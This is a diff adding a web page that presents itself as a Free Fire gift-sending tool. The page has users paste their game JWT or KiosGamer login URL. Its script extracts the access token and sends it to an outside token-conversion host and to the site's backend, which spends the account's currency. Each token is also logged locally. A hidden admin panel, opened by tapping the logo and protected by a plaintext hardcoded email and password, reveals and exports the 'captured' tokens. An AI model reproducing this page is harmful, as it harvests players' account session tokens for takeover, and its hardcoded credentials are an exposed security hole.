@@ -1,0 +1,482 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>SleepyXgift — Free Fire Gift Sender</title>
+<link rel="icon" href="/static/logo.jpg" />
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
+<script>
+  tailwind.config = {
+    theme: { extend: {
+      colors: {
+        bg: '#100820', card: '#1c1235', input: '#241640',
+        border: 'rgba(140,90,210,.35)', muted: '#a89bc4',
+        primary: '#b266ff', accent: '#e36ad6',
+        diamond: '#5cd0ff', gold: '#f5c542', destructive: '#ef4444',
+      }
+    }}
+  }
+</script>
+<style>
+  body{font-family:'Poppins',system-ui,sans-serif;color:#f4f0ff;min-height:100vh;
+       background:radial-gradient(circle at 20% 0%, #3a1d6e 0%, #100820 60%) fixed;}
+  .grad{background-image:linear-gradient(90deg,#b266ff,#e36ad6);}
+  .grad-text{background:linear-gradient(90deg,#b266ff,#e36ad6);-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .no-scrollbar::-webkit-scrollbar{display:none} .no-scrollbar{scrollbar-width:none}
+  .fade-in{animation:fi .25s ease both} @keyframes fi{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="sticky top-0 z-30 backdrop-blur bg-bg/70 border-b border-border">
+  <div class="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
+    <div class="flex items-center gap-3">
+      <button id="logoBtn" class="w-11 h-11 rounded-xl overflow-hidden ring-1 ring-primary/40 shadow-lg shadow-primary/40">
+        <img src="/static/logo.jpg" alt="SleepyXgift" class="w-full h-full object-cover pointer-events-none" draggable="false">
+      </button>
+      <h1 class="text-2xl font-extrabold tracking-tight"><span>SleepyX</span><span class="text-primary">gift</span></h1>
+    </div>
+    <button id="menuBtn" class="w-10 h-10 grid place-items-center text-primary text-2xl">☰</button>
+  </div>
+</header>
+
+<!-- LANDING -->
+<main id="landing" class="max-w-xl mx-auto px-4 pt-10 pb-12 text-center">
+  <div class="text-sm font-bold tracking-[0.25em] text-primary mb-3">• FREE FIRE GIFT TOOL</div>
+  <h1 class="text-5xl font-extrabold leading-tight">SLEEPYX<br>GIFT SENDER</h1>
+  <p class="text-muted mt-5 max-w-md mx-auto">
+    Paste your JWT, or paste the full KiosGamer URL — we'll auto-extract the EAT token and convert it to a JWT for you.
+  </p>
+  <div class="mt-8 p-6 rounded-2xl bg-card/70 border border-border backdrop-blur-sm text-left">
+    <h2 class="text-lg font-semibold flex items-center gap-2 mb-4">🔐 Authentication</h2>
+    <input id="jwtInput" placeholder="Paste JWT or KiosGamer URL"
+      class="w-full px-4 py-3.5 rounded-xl bg-input border border-border outline-none focus:border-primary">
+    <button id="startBtn" class="w-full mt-4 py-4 rounded-xl grad text-white font-bold tracking-wider shadow-lg shadow-primary/40 disabled:opacity-50">
+      GET STARTED&nbsp;&nbsp;🎁
+    </button>
+    <p id="landingErr" class="text-destructive text-sm mt-3 hidden"></p>
+  </div>
+</main>
+
+<!-- STORE -->
+<main id="store" class="max-w-6xl mx-auto px-4 pb-16 hidden">
+  <div class="mt-6 p-4 rounded-2xl bg-card/70 border border-border">
+    <div class="grid grid-cols-2 gap-3">
+      <div class="rounded-xl bg-input/60 border border-border p-3 text-center">
+        <div class="text-xs tracking-widest text-muted">DIAMONDS</div>
+        <div class="text-xl font-extrabold mt-1 text-diamond">💎 <span id="wDiamond">0</span></div>
+      </div>
+      <div class="rounded-xl bg-input/60 border border-border p-3 text-center">
+        <div class="text-xs tracking-widest text-muted">GOLD</div>
+        <div class="text-xl font-extrabold mt-1 text-gold">🪙 <span id="wGold">0</span></div>
+      </div>
+    </div>
+    <div class="mt-3 rounded-xl bg-input/60 border border-border p-3 text-center">
+      <div class="text-xs tracking-widest text-muted">LAST TOPUP</div>
+      <div class="text-primary font-semibold mt-1" id="wLast">—</div>
+    </div>
+  </div>
+
+  <div class="mt-8 text-center">
+    <h2 class="text-2xl font-bold flex items-center justify-center gap-2"><span>🛒</span> Gift Store</h2>
+    <div class="inline-block mt-3 px-4 py-1.5 rounded-lg border border-primary/40 text-primary text-sm bg-card/60">
+      🎁 Sent Today: <span id="sentToday">0</span>
+    </div>
+  </div>
+
+  <div class="mt-6 border-t border-border pt-5">
+    <input id="searchInput" placeholder="🔍 Search by item ID, commodity ID or category…"
+      class="w-full mb-4 px-4 py-3 rounded-xl bg-input border border-border outline-none focus:border-primary">
+    <div id="filterBar" class="flex flex-wrap gap-2 justify-center"></div>
+  </div>
+
+  <div id="errorBox" class="mt-6 text-center text-destructive hidden"></div>
+  <div id="grid" class="mt-6 grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4"></div>
+  <div id="sentinel" class="h-4 mt-8"></div>
+  <div id="loading" class="text-center text-muted py-4 hidden">Loading…</div>
+</main>
+
+<footer class="text-center text-xs text-muted py-6">Built with 💜 — SleepyXgift</footer>
+
+<!-- SIDE MENU -->
+<div id="sideMenu" class="fixed inset-0 z-40 hidden">
+  <div class="absolute inset-0 bg-black/60" data-close></div>
+  <aside class="absolute right-0 top-0 h-full w-[78%] max-w-xs bg-card border-l border-border overflow-y-auto">
+    <div class="flex items-center justify-between p-4 border-b border-border">
+      <div class="flex items-center gap-2">
+        <div class="w-9 h-9 rounded-lg overflow-hidden ring-1 ring-primary/40"><img src="/static/logo.jpg" class="w-full h-full object-cover"></div>
+        <span class="font-extrabold">SleepyX<span class="text-primary">gift</span></span>
+      </div>
+      <button data-close class="w-9 h-9 rounded-full border border-primary/40 text-primary">✕</button>
+    </div>
+    <div class="p-4 text-xs uppercase tracking-widest text-muted">📁 Categories</div>
+    <ul id="catList" class="px-2 pb-6"></ul>
+  </aside>
+</div>
+
+<!-- MODALS / TOAST -->
+<div id="modalRoot"></div>
+<div id="toast" class="fixed top-4 left-1/2 -translate-x-1/2 z-50 px-5 py-3 rounded-xl shadow-2xl text-sm font-medium max-w-[90vw] hidden"></div>
+
+<script>
+const IMG_BASE = "https://cdn.jsdelivr.net/gh/ShahGCreator/icon@main/PNG/";
+const JWT_GEN_URL = "https://ff-jwt-gen-api.lovable.app/api/public/token?eat_token=";
+
+const state = {
+  jwt: "", items: [], categories: [], category: "All",
+  page: 1, hasMore: true, loading: false, loaded: false,
+  filter: "All", search: "", wallet: null, sentToday: 0,
+};
+
+const $ = (s) => document.querySelector(s);
+
+function extractEat(input){
+  const s = input.trim(); if(!s) return null;
+  try{
+    const u = new URL(s);
+    const t = u.searchParams.get("eat") || u.searchParams.get("eat_token") || u.searchParams.get("access_token");
+    if(t) return t;
+    if(u.hash){
+      const h = new URLSearchParams(u.hash.replace(/^#/,""));
+      const t2 = h.get("eat")||h.get("eat_token")||h.get("access_token");
+      if(t2) return t2;
+    }
+  }catch{}
+  const m = s.match(/[?&](?:eat|eat_token|access_token)=([^&\s]+)/i);
+  return m ? decodeURIComponent(m[1]) : null;
+}
+
+function saveToken(entry){
+  try{
+    const k="sxg_admin_tokens";
+    const prev = JSON.parse(localStorage.getItem(k)||"[]");
+    prev.unshift({ts:Date.now(),...entry});
+    localStorage.setItem(k, JSON.stringify(prev.slice(0,500)));
+  }catch{}
+}
+
+function showToast(text, ok=true){
+  const t=$("#toast"); t.textContent=text;
+  t.className = "fixed top-4 left-1/2 -translate-x-1/2 z-50 px-5 py-3 rounded-xl shadow-2xl text-sm font-medium max-w-[90vw] " +
+    (ok ? "grad text-white" : "bg-destructive text-white");
+  t.classList.remove("hidden");
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(()=>t.classList.add("hidden"), 4000);
+}
+
+async function fetchPage({reset=false, cat=null, refresh=false, jwtOverride=null}={}){
+  if(state.loading) return;
+  state.loading = true; $("#loading").classList.remove("hidden");
+  $("#errorBox").classList.add("hidden");
+  const nextPage = reset ? 1 : state.page;
+  const category = cat ?? state.category;
+  const token = jwtOverride ?? state.jwt;
+  try{
+    const r = await fetch("/api/get-store",{
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({jwt:token, page:nextPage, limit:48, category, refresh}),
+    });
+    const data = await r.json();
+    if(!data.success){
+      $("#errorBox").textContent = data.message || "Failed to load";
+      $("#errorBox").classList.remove("hidden");
+      $("#landingErr").textContent = data.message || "Failed to load";
+      $("#landingErr").classList.remove("hidden");
+      state.loading=false; $("#loading").classList.add("hidden");
+      return false;
+    }
+    if(data.wallet) setWallet(data.wallet);
+    if(typeof data.sent_today === "number"){ state.sentToday = data.sent_today; $("#sentToday").textContent = data.sent_today; }
+    if(data.categories){ state.categories = data.categories; renderCats(); }
+    state.items = reset ? (data.items||[]) : state.items.concat(data.items||[]);
+    state.hasMore = !!data.has_more;
+    state.page = nextPage + 1;
+    state.loaded = true;
+    $("#landing").classList.add("hidden");
+    $("#store").classList.remove("hidden");
+    renderGrid();
+    state.loading=false; $("#loading").classList.add("hidden");
+    return true;
+  }catch(e){
+    $("#errorBox").textContent = e.message||"Network error";
+    $("#errorBox").classList.remove("hidden");
+    state.loading=false; $("#loading").classList.add("hidden");
+    return false;
+  }
+}
+
+function setWallet(w){
+  state.wallet = w;
+  $("#wDiamond").textContent = (w.diamond||0).toLocaleString();
+  $("#wGold").textContent = (w.gold||0).toLocaleString();
+  $("#wLast").textContent = w.last_topup || "—";
+}
+
+function renderCats(){
+  const ul = $("#catList"); ul.innerHTML = "";
+  ["All", ...state.categories].forEach(c=>{
+    const li = document.createElement("li");
+    const active = state.category === c;
+    li.innerHTML = `<button class="w-full text-left px-4 py-3 rounded-lg flex items-center gap-3 ${active?'text-primary bg-primary/10':'text-white/85 hover:bg-input/60'}">${c}</button>`;
+    li.firstElementChild.onclick = ()=>switchCategory(c);
+    ul.appendChild(li);
+  });
+}
+
+function renderFilters(){
+  const bar = $("#filterBar"); bar.innerHTML = "";
+  [
+    {k:"All", label:"ALL", icon:"🎁"},
+    {k:"Diamond", label:"DIAMOND", icon:"💎"},
+    {k:"Gold", label:"GOLD", icon:"🪙"},
+    {k:"DiamondGold", label:"DIAMOND + GOLD", icon:"💎🪙"},
+  ].forEach(f=>{
+    const b = document.createElement("button");
+    const on = state.filter === f.k;
+    b.className = `px-4 py-2.5 rounded-full font-bold text-xs transition-all flex items-center gap-1.5 ${on?'grad text-white shadow-lg shadow-primary/40':'bg-card text-white/80 border border-border hover:border-primary/60'}`;
+    b.innerHTML = `<span>${f.icon}</span>${f.label}`;
+    b.onclick = ()=>{ state.filter = f.k; renderFilters(); renderGrid(); };
+    bar.appendChild(b);
+  });
+}
+
+function dualSet(){
+  const m = new Map();
+  for(const i of state.items){
+    if(!m.has(i.commodity_id)) m.set(i.commodity_id, new Set());
+    m.get(i.commodity_id).add(i.currency);
+  }
+  const s = new Set();
+  for(const [id,c] of m) if(c.has("diamond")&&c.has("gold")) s.add(id);
+  return s;
+}
+
+function renderGrid(){
+  const g = $("#grid"); g.innerHTML = "";
+  const q = state.search.trim().toLowerCase();
+  const dual = dualSet();
+  const list = state.items.filter(i=>{
+    if(state.filter==="Diamond" && i.currency!=="diamond") return false;
+    if(state.filter==="Gold" && i.currency!=="gold") return false;
+    if(state.filter==="DiamondGold" && !dual.has(i.commodity_id)) return false;
+    if(!q) return true;
+    return i.item_id.includes(q) || i.category.toLowerCase().includes(q) || String(i.commodity_id).includes(q);
+  });
+  for(const it of list){
+    const div = document.createElement("div");
+    div.className = "rounded-2xl bg-card/80 border border-border p-3 flex flex-col fade-in";
+    div.innerHTML = `
+      <span class="self-start text-xs px-2.5 py-1 rounded-md bg-input/80 border border-border text-white/80">${it.category}</span>
+      <div class="aspect-square my-3 rounded-xl bg-gradient-to-br from-input to-card grid place-items-center overflow-hidden">
+        <img src="${IMG_BASE}${it.item_id}.png" loading="lazy" decoding="async" referrerpolicy="no-referrer"
+             onerror="this.replaceWith(Object.assign(document.createElement('span'),{className:'text-4xl opacity-40',textContent:'🎁'}))"
+             class="w-full h-full object-contain">
+      </div>
+      <div class="rounded-xl bg-input/60 border border-border py-2 text-center font-bold">${it.price_str}</div>
+      <div class="text-center text-xs text-muted mt-2">Expires: ${it.expire_date}</div>
+      <button class="mt-3 py-2.5 rounded-xl grad text-white font-bold text-sm shadow-md shadow-primary/30">SEND 🎁</button>
+    `;
+    div.querySelector("button").onclick = ()=>openGift(it);
+    g.appendChild(div);
+  }
+}
+
+async function switchCategory(c){
+  state.category = c; closeMenu();
+  state.items=[]; state.page=1; state.hasMore=true;
+  renderCats();
+  await fetchPage({reset:true, cat:c});
+}
+
+function openMenu(){ $("#sideMenu").classList.remove("hidden"); renderCats(); }
+function closeMenu(){ $("#sideMenu").classList.add("hidden"); }
+
+function showModal(html, setup){
+  const root = $("#modalRoot");
+  root.innerHTML = `<div class="fixed inset-0 z-50 grid place-items-center bg-black/70 backdrop-blur-sm p-4">
+    <div class="w-full max-w-sm rounded-2xl bg-card border border-primary/40 p-6 shadow-2xl">${html}</div></div>`;
+  const overlay = root.firstElementChild;
+  overlay.onclick = (e)=>{ if(e.target===overlay) closeModal(); };
+  setup && setup(overlay.firstElementChild);
+}
+function closeModal(){ $("#modalRoot").innerHTML = ""; }
+
+function openGift(it){
+  showModal(`
+    <h2 class="text-xl font-bold text-primary mb-4">Send Gift</h2>
+    <input id="mUid" placeholder="Enter Receiver UID" class="w-full px-4 py-3 rounded-xl bg-input border border-border outline-none focus:border-primary mb-3">
+    <input id="mMsg" placeholder="Message (optional)" value="Enjoy your gift!" class="w-full px-4 py-3 rounded-xl bg-input border border-border outline-none focus:border-primary mb-4">
+    <div class="text-center text-sm text-muted mb-4">${it.price_str} • ${it.category}</div>
+    <div class="grid grid-cols-2 gap-3">
+      <button id="mOk" class="py-3 rounded-xl grad text-white font-bold disabled:opacity-50">CONFIRM</button>
+      <button id="mCancel" class="py-3 rounded-xl bg-input text-white font-bold">CANCEL</button>
+    </div>
+  `, (m)=>{
+    m.querySelector("#mCancel").onclick = closeModal;
+    m.querySelector("#mOk").onclick = async ()=>{
+      const uid = m.querySelector("#mUid").value.trim();
+      if(!uid){ showToast("Enter Receiver UID", false); return; }
+      const msg = m.querySelector("#mMsg").value;
+      const btn = m.querySelector("#mOk"); btn.disabled = true; btn.textContent = "SENDING…";
+      try{
+        const r = await fetch("/api/send-gift",{
+          method:"POST", headers:{"Content-Type":"application/json"},
+          body: JSON.stringify({
+            jwt: state.jwt, receiver_uid: uid, commodity_id: it.commodity_id,
+            price: it.pure_price, currency: it.currency==="free"?"diamond":it.currency, message: msg,
+          })
+        });
+        const data = await r.json();
+        showToast(data.message, !!data.success);
+        if(data.success){
+          closeModal();
+          state.items=[]; state.page=1; state.hasMore=true;
+          fetchPage({reset:true, cat:state.category, refresh:true});
+        } else { btn.disabled=false; btn.textContent="CONFIRM"; }
+      }catch(e){ showToast(e.message||"Failed to send", false); btn.disabled=false; btn.textContent="CONFIRM"; }
+    };
+  });
+}
+
+// Admin
+let logoTaps = {n:0, t:null};
+function onLogoTap(){
+  logoTaps.n++; clearTimeout(logoTaps.t); logoTaps.t = setTimeout(()=>logoTaps.n=0,600);
+  if(logoTaps.n>=3){ logoTaps.n=0; openAdminLogin(); }
+}
+function openAdminLogin(){
+  showModal(`
+    <h2 class="text-xl font-bold text-primary mb-4">🔒 Admin Login</h2>
+    <input id="aU" placeholder="Username / Email" autocomplete="username" class="w-full px-4 py-3 rounded-xl bg-input border border-border outline-none focus:border-primary mb-3">
+    <input id="aP" type="password" placeholder="Password" autocomplete="current-password" class="w-full px-4 py-3 rounded-xl bg-input border border-border outline-none focus:border-primary mb-3">
+    <div id="aErr" class="text-destructive text-sm mb-3 hidden"></div>
+    <div class="grid grid-cols-2 gap-3">
+      <button id="aOk" class="py-3 rounded-xl grad text-white font-bold">LOGIN</button>
+      <button id="aCancel" class="py-3 rounded-xl bg-input text-white font-bold">CANCEL</button>
+    </div>
+  `,(m)=>{
+    m.querySelector("#aCancel").onclick = closeModal;
+    m.querySelector("#aOk").onclick = ()=>{
+      const u = m.querySelector("#aU").value.trim().toLowerCase();
+      const p = m.querySelector("#aP").value;
+      if(u==="notmeowl.net@gmail.com" && p==="Notmeowl60"){ closeModal(); openAdminPanel(); }
+      else { const e=m.querySelector("#aErr"); e.textContent="Invalid credentials"; e.classList.remove("hidden"); }
+    };
+  });
+}
+function openAdminPanel(){
+  const entries = (()=>{try{return JSON.parse(localStorage.getItem("sxg_admin_tokens")||"[]");}catch{return [];}})();
+  const revealed = new Set();
+  const root = $("#modalRoot");
+  function render(){
+    root.innerHTML = `
+      <div class="fixed inset-0 z-50 bg-bg overflow-y-auto">
+        <header class="sticky top-0 z-10 backdrop-blur bg-bg/80 border-b border-border">
+          <div class="max-w-4xl mx-auto px-4 py-3 flex items-center justify-between">
+            <h2 class="text-lg font-extrabold text-primary">🛡️ Admin Panel</h2>
+            <div class="flex gap-2">
+              <button id="apExp" class="px-3 py-1.5 rounded-lg bg-input text-white text-xs font-bold">EXPORT</button>
+              <button id="apClr" class="px-3 py-1.5 rounded-lg bg-destructive text-white text-xs font-bold">CLEAR</button>
+              <button id="apX"   class="px-3 py-1.5 rounded-lg border border-primary/40 text-primary text-xs font-bold">✕</button>
+            </div>
+          </div>
+        </header>
+        <main class="max-w-4xl mx-auto px-4 py-6">
+          <div class="mb-4 text-sm text-muted">${entries.length} saved token${entries.length===1?'':'s'} (stored locally in this browser)</div>
+          ${entries.length===0
+            ? `<div class="text-center text-muted py-12">No tokens captured yet.</div>`
+            : `<ul class="space-y-3">${entries.map(e=>`
+                <li class="p-4 rounded-2xl bg-card border border-border">
+                  <div class="flex items-center justify-between mb-2">
+                    <span class="text-xs text-muted">${new Date(e.ts).toLocaleString()}</span>
+                    <button data-toggle="${e.ts}" class="text-xs text-primary font-bold">${revealed.has(e.ts)?'HIDE':'REVEAL'}</button>
+                  </div>
+                  ${e.eat?`<div class="mb-2">
+                    <div class="flex items-center justify-between mb-1"><span class="text-xs font-bold text-white/70">EAT TOKEN</span><button data-copy="${e.ts}-eat" class="text-xs text-primary">copy</button></div>
+                    <div class="text-xs font-mono break-all bg-input rounded-lg p-2 border border-border">${revealed.has(e.ts)?escape_(e.eat):escape_(e.eat.slice(0,24)+'…'+e.eat.slice(-8))}</div>
+                  </div>`:''}
+                  ${e.jwt?`<div>
+                    <div class="flex items-center justify-between mb-1"><span class="text-xs font-bold text-white/70">JWT</span><button data-copy="${e.ts}-jwt" class="text-xs text-primary">copy</button></div>
+                    <div class="text-xs font-mono break-all bg-input rounded-lg p-2 border border-border">${revealed.has(e.ts)?escape_(e.jwt):escape_(e.jwt.slice(0,24)+'…'+e.jwt.slice(-8))}</div>
+                  </div>`:''}
+                </li>`).join("")}</ul>`}
+        </main>
+      </div>`;
+    root.querySelector("#apX").onclick = closeModal;
+    root.querySelector("#apExp").onclick = ()=>{
+      const blob = new Blob([JSON.stringify(entries,null,2)],{type:"application/json"});
+      const url = URL.createObjectURL(blob); const a=document.createElement("a");
+      a.href=url; a.download=`sleepyx-tokens-${Date.now()}.json`; a.click(); URL.revokeObjectURL(url);
+    };
+    root.querySelector("#apClr").onclick = ()=>{
+      if(!confirm("Delete all saved tokens?")) return;
+      localStorage.removeItem("sxg_admin_tokens"); entries.length=0; render();
+    };
+    root.querySelectorAll("[data-toggle]").forEach(b=>b.onclick=()=>{
+      const ts=Number(b.dataset.toggle); revealed.has(ts)?revealed.delete(ts):revealed.add(ts); render();
+    });
+    root.querySelectorAll("[data-copy]").forEach(b=>b.onclick=()=>{
+      const [ts,kind]=b.dataset.copy.split("-"); const e=entries.find(x=>String(x.ts)===ts);
+      if(e && e[kind]) navigator.clipboard?.writeText(e[kind]);
+    });
+  }
+  function escape_(s){return String(s).replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));}
+  render();
+}
+
+// Start auth
+async function handleStart(){
+  const raw = $("#jwtInput").value.trim();
+  const err = $("#landingErr"); err.classList.add("hidden");
+  if(!raw){ err.textContent="Paste your JWT or KiosGamer URL first."; err.classList.remove("hidden"); return; }
+  const btn = $("#startBtn"); btn.disabled=true; btn.textContent="AUTHENTICATING…";
+  const eat = extractEat(raw);
+  try{
+    let token = raw;
+    if(eat){
+      saveToken({eat});
+      const r = await fetch(JWT_GEN_URL + encodeURIComponent(eat));
+      const data = await r.json();
+      token = data.jwt || data.token || data.access_token || data.data?.jwt || data.data?.token;
+      if(!data.success || !token){
+        err.textContent = data.message || data.error || "Failed to generate JWT from EAT token.";
+        err.classList.remove("hidden");
+        btn.disabled=false; btn.textContent="GET STARTED  🎁";
+        return;
+      }
+      saveToken({eat, jwt:token});
+    } else {
+      saveToken({jwt:raw});
+    }
+    state.jwt = token;
+    state.items=[]; state.page=1; state.hasMore=true; state.category="All";
+    const ok = await fetchPage({reset:true, cat:"All", refresh:true, jwtOverride:token});
+    if(ok){ renderFilters(); window.scrollTo(0,0); }
+  }catch(e){
+    err.textContent = e.message||"Network error"; err.classList.remove("hidden");
+  } finally {
+    btn.disabled=false; btn.textContent="GET STARTED  🎁";
+  }
+}
+
+// Wire events
+$("#startBtn").onclick = handleStart;
+$("#jwtInput").addEventListener("keydown", e=>{ if(e.key==="Enter") handleStart(); });
+$("#menuBtn").onclick = openMenu;
+$("#logoBtn").onclick = onLogoTap;
+$("#searchInput").addEventListener("input", e=>{ state.search = e.target.value; renderGrid(); });
+document.querySelectorAll("[data-close]").forEach(b=>b.onclick=closeMenu);
+
+// Infinite scroll
+let userScrolled = false;
+window.addEventListener("scroll",()=>{ if(window.scrollY>50) userScrolled=true; },{passive:true});
+new IntersectionObserver((ents)=>{
+  if(!state.loaded || !userScrolled) return;
+  if(ents[0].isIntersecting && state.hasMore && !state.loading) fetchPage();
+},{rootMargin:"200px"}).observe($("#sentinel"));
+</script>
+</body>
+</html>
